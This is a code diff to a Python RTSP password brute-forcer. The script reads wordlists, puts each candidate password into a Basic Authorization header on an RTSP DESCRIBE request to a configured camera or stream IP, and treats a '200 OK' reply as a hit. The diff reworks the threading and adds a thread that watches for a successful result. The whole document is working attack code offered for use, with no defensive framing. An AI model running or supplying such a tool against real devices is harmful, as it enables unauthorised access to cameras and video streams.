@@ -1,16 +1,12 @@
 import base64
 import concurrent.futures
-
 import os
 import re
 import socket
-
-from concurrent.futures import ThreadPoolExecutor
-
+import time
+from threading import Thread
 
 from config import Config
-
-
 
 
 class RTSPBruteForce:
@@ -20,6 +16,25 @@ class RTSPBruteForce:
         self.digits = self.config.digits
         self.symbols = self.config.symbols
         self.length = self.config.length
+        self.running_tasks = []
+        Thread(target=self.print_res).start()
+
+    def print_res(self):
+        match = False
+        while not match:
+            try:
+                print(f'running tasks: {len(self.running_tasks)}')
+                for task in self.running_tasks:
+                    if task.done():
+                        if task.result() and task.result()[0]:
+                            print(task.result())
+                            match = True
+                        self.running_tasks.remove(task)
+                time.sleep(2)
+            except Exception as e:
+                print(e)
+
+
 
     def digest_response(self, response, password):
         if '200 OK' in str(response) or password == self.config.debug_password:
@@ -44,27 +59,16 @@ class RTSPBruteForce:
 
     def tasks_orchestrator(self, passwords):
         bulker = []
-        with ThreadPoolExecutor() as executor:
-            for password in passwords:
-                bulker.append(password)
-                # while executor._counter() >= 10:
-                #     print(executor._counter())
-                #     time.sleep(5)
-
-                if len(bulker) >= self.config.bf_bulker:
-                    tasks = [executor.submit(self.create_conn, bulker)]
-                    bulker = []
-
-            for f in concurrent.futures.as_completed(tasks):
-                print(f.results())
-                if '200 OK' in f.result():
-                    return True
-                    executor.shutdown()
-
-
-            # if self.create_conn(password=str(line)):aatrH
-            #     return True
-
+        for password in passwords:
+            bulker.append(password)
+            print(len(bulker))
+            while len(self.running_tasks) >= self.config.concurent_workers:
+                time.sleep(3)
+            if len(bulker) >= self.config.bf_bulker:
+                with concurrent.futures.ThreadPoolExecutor() as self.executor:
+                    print('adding task')
+                    self.running_tasks.append(self.executor.submit(self.create_conn, bulker))
+                bulker = []
 
     def run(self):
         files = self.get_pass_files()
@@ -80,6 +84,7 @@ class RTSPBruteForce:
         try:
             for password in pass_bulk:
                 # time.sleep(0.05)
+                # print(password)
                 b64 = self.base64encode(password=password)
                 dest = f"DESCRIBE rtsp://{self.config.rtsp_ip}:{self.config.rtsp_port}/unicast RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic {b64}\r\n\r\n"
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -88,10 +93,10 @@ class RTSPBruteForce:
                 response = s.recv(128)
                 match, msg, password = self.digest_response(response, password)
                 if match:
-                    print(match, msg, password)
+                    # print(match, msg, password)
                     return [match, msg, password]
-                elif "Unauthorized" not in msg:
-                    print(match, msg, password)
+                # elif "Unauthorized" not in msg:
+                #     print(match, msg, password)
         except socket.error as e:
             print(e)
         except (ConnectionRefusedError, ConnectionResetError) as e:
